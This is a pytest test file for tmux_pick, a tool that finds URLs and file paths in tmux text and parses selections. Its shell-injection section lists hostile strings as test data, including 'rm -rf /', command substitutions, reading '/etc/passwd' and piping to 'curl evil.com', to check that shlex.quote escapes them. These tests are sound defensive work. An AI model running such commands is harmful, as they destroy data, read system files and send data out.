"""Tests for pattern extraction and parsing logic."""

import pathlib
import shlex

import pytest

from tmux_pick.core import (
    Config,
    extract_value_from_selection,
    find_patterns_in_text,
    get_action_for_selection,
    load_bundled_config,
    parse_selection,
)


@pytest.fixture
def config() -> Config:
    """Sample configuration for testing."""
    return {
        "patterns": [
            {
                "name": "URL",
                "regex": r"https?://[^\s]+",
                "description": "HTTP/HTTPS URLs",
                "action": "open_url",
                "enabled": True,
            },
            {
                "name": "FILE",
                "regex": r"([a-zA-Z0-9_/.-]+\.(py|js|md))",
                "description": "File paths",
                "action": "open_file",
                "enabled": True,
            },
            {
                "name": "DISABLED",
                "regex": r"disabled",
                "description": "Disabled pattern",
                "action": "noop",
                "enabled": False,
            },
        ],
        "actions": {
            "open_url": {
                "command": "open {value}",
            },
            "open_file": {
                "command": "vim {value}",
            },
        },
    }


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "Check out https://example.com and http://test.org",
            [
                "http://test.org\tURL",
                "https://example.com\tURL",
            ],
        ),
        (
            "See main.py and docs/readme.md for details",
            [
                "docs/readme.md\tFILE",
                "main.py\tFILE",
            ],
        ),
        ("This has a disabled pattern", []),
        ("", []),
    ],
)
def test_find_patterns_in_text(config: Config, text: str, expected: list[str]) -> None:
    """Test extracting patterns from text."""
    result = find_patterns_in_text(text, config)
    assert result == expected


def test_find_patterns_deduplication(config: Config) -> None:
    """Test that duplicate matches are deduplicated."""
    text = "https://example.com and https://example.com again"
    result = find_patterns_in_text(text, config)
    assert result == ["https://example.com\tURL"]


def test_find_patterns_capture_group(config: Config) -> None:
    """Test that regex capture groups are used if present."""
    text = "Check out src/main.py"
    result = find_patterns_in_text(text, config)
    assert result == ["src/main.py\tFILE"]


@pytest.mark.parametrize(
    ("selection", "expected"),
    [
        ("https://example.com\tURL", ("URL", "https://example.com")),
        ("main.py\tFILE", ("FILE", "main.py")),
        ("\tURL", ("URL", "")),
    ],
)
def test_parse_selection_valid(selection: str, expected: tuple[str, str]) -> None:
    """Test parsing valid selection formats."""
    result = parse_selection(selection)
    assert result == expected


@pytest.mark.parametrize(
    "selection",
    [
        "no_tab_here",
        "",
    ],
)
def test_parse_selection_invalid(selection: str) -> None:
    """Test parsing invalid selection formats."""
    result = parse_selection(selection)
    assert result is None


@pytest.mark.parametrize(
    ("selection", "expected_command", "expected_value"),
    [
        ("https://example.com\tURL", "open {value}", "https://example.com"),
        ("main.py\tFILE", "vim {value}", "main.py"),
    ],
)
def test_get_action_for_selection_valid(
    config: Config,
    selection: str,
    expected_command: str,
    expected_value: str,
) -> None:
    """Test getting action for valid selections."""
    result = get_action_for_selection(selection, config)
    assert result is not None
    action, value = result
    assert action["command"] == expected_command
    assert value == expected_value


@pytest.mark.parametrize(
    "selection",
    [
        "test\tUNKNOWN",
        "\tURL",
        "not a valid selection",
    ],
)
def test_get_action_for_selection_invalid(config: Config, selection: str) -> None:
    """Test getting action for invalid selections."""
    result = get_action_for_selection(selection, config)
    assert result is None


@pytest.mark.parametrize(
    ("selection", "expected_value"),
    [
        pytest.param("https://example.com\tURL", "https://example.com", id="url"),
        pytest.param("main.py\tFILE", "main.py", id="file"),
        pytest.param("test.com\tURL", "test.com", id="simple"),
    ],
)
def test_extract_value_from_selection(
    selection: str, expected_value: str, capsys: pytest.CaptureFixture[str]
) -> None:
    """Test extracting value from valid selections."""
    extract_value_from_selection(selection)
    captured = capsys.readouterr()
    assert captured.out.strip() == expected_value


def test_extract_value_from_selection__invalid_format(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Test extracting value from invalid selection exits with error."""
    with pytest.raises(SystemExit) as exc_info:
        extract_value_from_selection("invalid selection")
    assert exc_info.value.code == 1
    captured = capsys.readouterr()
    assert "invalid selection" in captured.err


# Tab Handling Tests


@pytest.mark.parametrize(
    ("selection", "expected"),
    [
        ("test\ttab\tvalue\tFILE", ("FILE", "test\ttab\tvalue")),
        ("a\t\tb\tURL", ("URL", "a\t\tb")),
        ("\tvalue\tFILE", ("FILE", "\tvalue")),
        ("simple.py\tFILE", ("FILE", "simple.py")),
        ("\tURL", ("URL", "")),
    ],
)
def test_parse_selection_with_tabs(selection: str, expected: tuple[str, str]) -> None:
    """Test parsing selections where value contains tabs."""
    result = parse_selection(selection)
    assert result == expected


@pytest.mark.parametrize(
    "selection",
    [
        "no_tab_here",
        "",
    ],
)
def test_parse_selection_invalid_with_tabs(selection: str) -> None:
    """Test parsing rejects invalid selections."""
    result = parse_selection(selection)
    assert result is None


def test_parse_selection_ambiguous_tabs() -> None:
    """Test parsing with multiple tabs uses rightmost as delimiter.

    With rsplit, "value\tFI\tLE" splits into value="value\tFI", type="LE".
    This is valid - we treat the rightmost tab as the delimiter.
    """
    result = parse_selection("value\tFI\tLE")
    assert result == ("LE", "value\tFI")


# Newline Validation Tests


def test_get_action_for_selection_rejects_newlines(
    config: Config, capsys: pytest.CaptureFixture[str]
) -> None:
    """Test complete pipeline rejects values with newlines."""
    selection = "line1\nline2\tFILE"

    result = get_action_for_selection(selection, config)
    assert result is None

    captured = capsys.readouterr()
    assert "newlines" in captured.err.lower()


# Shell Injection Prevention Tests


@pytest.mark.parametrize(
    "dangerous_value",
    [
        "test'; rm -rf /",
        "$(whoami).log",
        "`cat /etc/passwd`",
        "test && whoami",
        "test | curl evil.com",
        "test > /tmp/hacked",
        'test"with"quotes',
        "test'with'quotes",
        "test\\with\\backslash",
        "$HOME/test",
        "${EVIL_VAR}",
    ],
)
def test_shlex_quote_escapes_dangerous_values(dangerous_value: str) -> None:
    """Test that shlex.quote properly escapes dangerous values."""
    safe = shlex.quote(dangerous_value)

    # Verify the value is quoted
    assert safe.startswith("'") or safe.startswith('"') or "\\" in safe or "'" in safe

    # Verify shell metacharacters are escaped
    # The escaped value should not allow command injection
    # This is a basic sanity check - the actual security comes from shlex.quote
    assert safe != dangerous_value or dangerous_value.isalnum()


@pytest.fixture
def default_config() -> Config:
    """Load the bundled default config (tests production regex patterns)."""
    return load_bundled_config()


@pytest.mark.parametrize(
    ("text", "expected_values"),
    [
        ("error in /path/to/file.py:42 here", ["/path/to/file.py:42"]),
        ("see ~/config/init.lua:5 for setup", ["~/config/init.lua:5"]),
        ("open ./src/main.rs:100 now", ["./src/main.rs:100"]),
        ("check /path/to/file.py no line", ["/path/to/file.py"]),
        ("config.toml:5 is wrong", ["config.toml:5"]),
        ("see README.md for details", ["README.md"]),
        ("strip trailing dot /path/to/file.py.", ["/path/to/file.py"]),
        ("strip trailing comma /path/to/file.py,", ["/path/to/file.py"]),
        ("not a path -----", []),
        ("bare ~ is not a path", []),
    ],
)
def test_file_pattern_line_numbers(
    default_config: Config, text: str, expected_values: list[str]
) -> None:
    """Test FILE pattern extracts paths with optional line numbers."""
    results = find_patterns_in_text(text, default_config)
    file_results = [r for r in results if r.endswith("\tFILE")]
    values = [r.split("\t")[0] for r in file_results]
    assert values == expected_values


def test_file_validation_filters_nonexistent(tmp_path: pathlib.Path) -> None:
    """FILE matches are dropped when path does not exist and pane_path is set."""
    config = load_bundled_config()
    results = find_patterns_in_text(
        "open /nonexistent/path/file.py here", config, str(tmp_path)
    )
    file_results = [r for r in results if r.endswith("\tFILE")]
    assert file_results == []


def test_file_validation_passes_existent(tmp_path: pathlib.Path) -> None:
    """FILE matches survive when path exists relative to pane_path."""
    f = tmp_path / "main.py"  # type: ignore[operator]
    _ = f.write_text("x = 1")
    config = load_bundled_config()
    results = find_patterns_in_text(f"open {f} here", config, str(tmp_path))
    file_results = [r for r in results if r.endswith("\tFILE")]
    assert len(file_results) == 1
    assert file_results[0].split("\t")[0] == str(f)


def test_file_validation_relative_path(tmp_path: pathlib.Path) -> None:
    """Relative FILE paths are resolved against pane_path before checking existence."""
    f = tmp_path / "config.toml"  # type: ignore[operator]
    _ = f.write_text("[tool]")
    config = load_bundled_config()
    results = find_patterns_in_text(
        "see config.toml for details", config, str(tmp_path)
    )
    file_results = [r for r in results if r.endswith("\tFILE")]
    assert any("config.toml" in r for r in file_results)


def test_file_validation_skipped_without_pane_path(default_config: Config) -> None:
    """When pane_path is None validation is skipped and all matches are returned."""
    results = find_patterns_in_text(
        "open /nonexistent/path/file.py here", default_config
    )
    file_results = [r for r in results if r.endswith("\tFILE")]
    assert len(file_results) == 1


def test_full_pipeline_with_tabs(config: Config) -> None:
    """Test complete pipeline handles tabs in values correctly."""
    selection = "path/with\ttabs.txt\tFILE"

    result = get_action_for_selection(selection, config)
    assert result is not None

    action, value = result
    assert value == "path/with\ttabs.txt"
    assert action["command"] == "vim {value}"
